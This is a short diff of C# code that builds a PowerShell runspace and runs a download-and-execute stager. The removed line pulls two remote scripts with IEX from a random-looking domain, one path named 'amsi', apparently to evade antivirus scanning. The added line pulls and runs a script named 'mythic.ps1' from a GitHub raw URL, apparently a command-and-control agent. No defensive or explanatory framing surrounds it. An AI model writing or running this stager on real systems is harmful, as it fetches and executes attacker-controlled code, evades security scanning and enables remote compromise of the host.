@@ -30,8 +30,7 @@
                       using (var posh = PowerShell.Create())
                       {
                         posh.Runspace = runspace;
-                        posh.AddScript("IEX ((new-object net.webclient).downloadstring('http://nbqtddutqn.org/amsi'));IEX ((n
-ew-object net.webclient).downloadstring('http://nbqtddutqn.org/a'))");
+                        posh.AddScript("IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/chr0n1k/AL2021/main/mythic.ps1'))");
                                                 
                         var results = posh.Invoke();
                         var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
